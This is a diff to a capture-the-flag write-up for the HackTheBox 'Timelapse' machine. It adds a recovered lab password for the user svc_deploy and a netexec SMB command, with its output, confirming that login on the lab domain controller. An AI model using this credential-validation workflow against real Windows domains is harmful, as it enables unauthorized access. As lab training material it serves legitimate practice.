@@ -301,5 +301,14 @@ exit
 ```
 Found a password for the user `svc_deploy`
 
-```py
+```python
+svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
 ```
+
+```python
+# nxc smb dc01.timelapse.htb -u svc_deploy -p 'E3R$Q62^12p7PLlC%KWaxuaV'                     
+SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.227.113  445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
+```
+This user is now compromised
+
